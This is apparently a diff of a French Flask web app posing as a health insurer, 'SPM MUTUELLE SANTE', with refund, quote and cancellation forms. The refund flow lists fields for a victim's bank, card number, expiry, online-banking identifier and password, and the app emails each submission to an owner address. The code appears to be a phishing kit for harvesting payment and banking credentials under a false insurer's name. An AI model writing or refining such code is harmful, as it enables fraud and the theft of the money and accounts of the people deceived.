@@ -1,36 +1,37 @@
 import os
-import random
 import re
+import random
 from datetime import datetime, timezone
-from html import escape
-from pathlib import Path
 
 import requests
+from flask import (Flask, render_template, request, redirect,
+                   url_for, session, flash, send_file)
+from markupsafe import escape
 from dotenv import load_dotenv
-from flask import Flask, redirect, render_template, request, send_file, session, url_for
 
-DOSSIER_APP = Path(__file__).resolve().parent
-load_dotenv(DOSSIER_APP / ".env")
+# ============================================================
+# CONFIG
+# ============================================================
+load_dotenv()
+
+RESEND_API_KEY = os.environ.get("RESEND_API_KEY", "")
+SENDER_EMAIL   = os.environ.get("SENDER_EMAIL", "SPM MUTUELLE SANTE <onboarding@resend.dev>")
+EMAIL_REPLY_TO = os.environ.get("EMAIL_REPLY_TO", "")
+OWNER_EMAIL    = os.environ.get("OWNER_EMAIL", "")
+
+print(">>> KEY PRESENT :", bool(RESEND_API_KEY),
+      "| LEN:", len(RESEND_API_KEY),
+      "| START:", RESEND_API_KEY[:3])
+print(">>> SENDER      :", SENDER_EMAIL)
+if not RESEND_API_KEY:
+    print(">>> ATTENTION : RESEND_API_KEY est VIDE. Le .env n'est pas lu ou mal place.")
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "changez-moi-en-production")
 
-RESEND_API_KEY = os.environ.get("RESEND_API_KEY", "")
-SENDER_EMAIL = os.environ.get("SENDER_EMAIL", "SPM MUTUELLE SANTE <noreply@crasdor.org>")
-EMAIL_REPLY_TO = os.environ.get("EMAIL_REPLY_TO", "")
-OWNER_EMAIL = os.environ.get("OWNER_EMAIL", "")
-
-if not RESEND_API_KEY:
-    print("!" * 64)
-    print("ATTENTION : cle Resend introuvable, les emails ne seront PAS envoyes.")
-    print("Le fichier .env est cherche exactement ici :")
-    print("   ", DOSSIER_APP / ".env")
-    print("Verifiez que le fichier s'appelle bien .env (et pas .env.txt)")
-    print("puis relancez : py app.py")
-    print("!" * 64)
-else:
-    print(">> Cle Resend chargee. Les emails seront envoyes a :", OWNER_EMAIL)
-
+# ============================================================
+# DONNEES STATIQUES
+# ============================================================
 MOTIFS_RESILIATION = [
     "Je n'utilise plus le produit / service",
     "Tarif trop élevé",
@@ -38,7 +39,6 @@ MOTIFS_RESILIATION = [
     "Déménagement",
     "Autre motif",
 ]
-
 REFUND_STEPS = [(1, "Vos informations"), (2, "Remboursement")]
 BANQUES = ["BNP Paribas", "Crédit Agricole", "Société Générale", "Banque Populaire", "Caisse d'Épargne",
            "LCL", "Crédit Mutuel", "La Banque Postale", "Boursorama", "Hello bank!", "Fortuneo",
@@ -49,9 +49,8 @@ LIBELLES_E2 = {"banque": "votre banque", "carte": "numéro de la carte", "expira
                "site_number": "numéro du site", "identifiant": "identifiant", "password": "mot de passe"}
 DEVIS_STEPS = [(1, "Coordonnées"), (2, "Votre demande")]
 
-
 # ============================================================
-# EMAILS (Resend) — aucune donnée n'est enregistrée ailleurs
+# EMAILS (Resend)
 # ============================================================
 def send_email(to, subject, html, reply_to=None):
     if not RESEND_API_KEY:
@@ -62,13 +61,16 @@ def send_email(to, subject, html, reply_to=None):
     target = reply_to or EMAIL_REPLY_TO
     if target:
         payload["reply_to"] = target
-    app.logger.warning(f"DEBUG clé Resend (10 premiers car.) = '{RESEND_API_KEY[:10]}' | longueur = {len(RESEND_API_KEY)}")
     resp = requests.post(
         "https://api.resend.com/emails",
-        headers={"Authorization": f"Bearer {RESEND_API_KEY}"},
+        headers={
+            "Authorization": f"Bearer {RESEND_API_KEY}",
+            "Content-Type": "application/json",
+        },
         json=payload,
-        timeout=30,
     )
+    if resp.status_code >= 400:
+        app.logger.error(f"Resend {resp.status_code} : {resp.text}")
     resp.raise_for_status()
     return resp.json().get("id")
 
@@ -120,7 +122,7 @@ def notify(kind, reference, nom, email, rows, owner_extra=None):
     try:
         send_email(
             email,
-            f"SPM MUTUELLE SANTE— Confirmation de votre demande {reference}",
+            f"SPM MUTUELLE SANTE — Confirmation de votre demande {reference}",
             client_html(kind, nom, reference, rows),
         )
     except Exception as e:
@@ -148,26 +150,19 @@ def date_valide(d):
 def nouvelle_ref(prefix):
     return f"{prefix}-{datetime.now(timezone.utc).year}-{random.randint(10000, 99999)}"
 
-
 # ============================================================
-# ACCUEIL — page de bienvenue élégante
+# ROUTES
 # ============================================================
 @app.route("/")
 def accueil():
     return render_template("index.html")
 
 
-# ============================================================
-# SERVICES — les 3 options
-# ============================================================
 @app.route("/services")
 def services():
     return render_template("services.html")
 
 
-# ============================================================
-# REMBOURSEMENT — 2 pages
-# ============================================================
 @app.route("/etape-1", methods=["GET", "POST"])
 def etape1():
     data = session.get("r1", {"nom": "", "prenom": "", "adresse": "", "email": "", "birth_date": "", "phone": "", "montant": ""})
@@ -236,9 +231,6 @@ def etape2():
     return render_template("etape2.html", step=2, step_labels=REFUND_STEPS, data=data, error=error, banques=BANQUES, titulaire=titulaire, header_bleu=True)
 
 
-# ============================================================
-# DEVIS — 2 pages
-# ============================================================
 @app.route("/devis", methods=["GET", "POST"])
 def devis():
     data = session.get("d1", {"nom": "", "prenom": "", "email": "", "birth_date": "", "phone": ""})
@@ -296,9 +288,6 @@ def devis2():
     return render_template("devis2.html", step=2, step_labels=DEVIS_STEPS, data=data, error=error)
 
 
-# ============================================================
-# RÉSILIATION — 1 page
-# ============================================================
 @app.route("/resiliation", methods=["GET", "POST"])
 def resiliation():
     data = {"nom": "", "email": "", "order_number": "", "motif": "", "date_souhaitee": ""}
@@ -325,9 +314,6 @@ def resiliation():
     return render_template("resiliation.html", data=data, error=error, motifs=MOTIFS_RESILIATION)
 
 
-# ============================================================
-# TÉLÉCHARGEMENT DU CODE SOURCE (preview uniquement)
-# ============================================================
 ZIP_CODE = "/app/meindjo-flask.zip"
 
 
